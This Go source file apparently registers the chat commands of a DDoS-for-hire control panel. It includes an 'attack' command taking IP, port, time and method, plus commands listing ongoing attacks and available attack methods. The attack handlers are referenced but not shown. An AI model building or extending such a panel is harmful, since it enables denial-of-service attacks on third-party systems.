package commands

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"api/core/net/sessions"
)

var Commands 	= make(map[string]*CommandDetails)
var logger 		= log.New(os.Stderr, "[command] ", log.Ltime|log.Lshortfile)

type CommandDetails struct {
	Name        string
	Description string
	Admin       bool
	System		bool
	Exec        func(sesh *sessions.Session, args []string)
}

func Init() {
	fmt.Print("Loading Commands...")

	//find files
	commandsDir := "assets/banners"

	// Load commands
	err := loadCommandsFromDirectory(commandsDir)
	if err != nil {
		logger.Printf("Error loading commands: %v\n", err)
	}

	getCMD()
}

func loadCommandsFromDirectory(dir string) error {
	files, err := os.ReadDir(dir)
	if err != nil {
		return fmt.Errorf("failed to read directory %s: %v", dir, err)
	}

	for _, file := range files {
		if !file.IsDir() && filepath.Ext(file.Name()) == ".tfx" {
			err := registerCommandFromFile(filepath.Join(dir, file.Name()))
			if err != nil {
				logger.Printf("Error registering command from file %s: %v\n", file.Name(), err)
			}
		}
	}

	return nil
}

func registerCommandFromFile(filepath string) error {
    details, lines, err := parseTFXFile(filepath)
    if err != nil {
        return fmt.Errorf("error parsing file %s: %v", filepath, err)
    }

    cmd := &CommandDetails{
        Name:        details.Name,
        Description: details.Description,
        Admin:       details.Admin,
        System:      details.System,
        Exec: func(session *sessions.Session, args []string) {
            processLines(session, lines, details)
        },
    }

    Commands[cmd.Name] = cmd
    return nil
}

func getCMD() error {
	Commands["admin"] = &CommandDetails{
		Name:        "help",
		Description: "help",
		Admin:       true,
		System:		 false,
		Exec:        admin,
	}
	Commands["search"] = &CommandDetails{
		Name:        "search",
		Description: "search for a user",
		Admin:       true,
		System:		 false,
		Exec:        user,
	}
	Commands["edit"] = &CommandDetails{
		Name:        "edit",
		Description: "Edit the user",
		Admin:       true,
		System:		 false,
		Exec:        editUser,
	}
	Commands["credits"] = &CommandDetails{
		Name:        "credits",
		Description: "credits",
		Admin:       false,
		System:		 false,
		Exec:        credits,
	}
	Commands["attack"] = &CommandDetails{
		Name:        "attack",
		Description: "Initiate an attack: /attack ip port time method",
		Admin:       false,
		System:		 false,
		Exec:        attack,
	}
	Commands["users"] = &CommandDetails{
		Name:        "users",
		Description: "displays user list",
		Admin:       false,
		System:		 false,
		Exec:        users,
	}
	Commands["ongoing"] = &CommandDetails{
		Name:        "ongoing",
		Description: "displays ongoing attacks",
		Admin:       false,
		System:		 false,
		Exec:        ongoing,
	}
	Commands["reload"] = &CommandDetails{
		Name:        "reload",
		Description: "reloads the net commands!",
		Admin:       true,
		System:		 false,
		Exec:        reload,
	}
	Commands["exit"] = &CommandDetails{
		Name:        "exit",
		Description: "Logout!",
		Admin:       true,
		System:		 false,
		Exec:        logout,
	}
	Commands["methods"] = &CommandDetails{
		Name:        "methods",
		Description: "Displays all attack methods!",
		Admin:       true,
		System:		 false,
		Exec:        methods,
	}
	for _, v := range Commands {
		logger.Printf("Successfully added "+v.Name+" : "+v.Description+" | Admin : %t", v.Admin)
	}
    return nil
}

func IsCommand(cmd string) bool {
    command, found := Commands[cmd]
    if !found {
        return false
    }
    return !command.System
}

func isAdmin(sessions *sessions.Session) bool {
	if sessions.User.HasPermission("admin") {
		return true
	} else {
		return false
	}
}
